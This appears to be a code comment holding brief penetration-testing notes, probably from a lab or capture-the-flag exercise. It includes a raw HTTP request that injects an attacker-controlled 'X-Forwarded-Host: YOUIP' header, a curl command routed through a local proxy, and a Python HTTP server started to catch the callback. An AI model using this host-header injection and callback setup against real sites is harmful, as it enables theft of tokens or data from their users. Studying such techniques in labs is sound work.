/*
GET /letters?id=12 HTTP/1.1
Host: 127.0.0.1
X-Forwarded-Host: YOUIP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


curl -i -H "x-forwarded-port:80" -x http://127.0.0.1:1337 http:<instanceip> -k

py -m http.server 80
*/

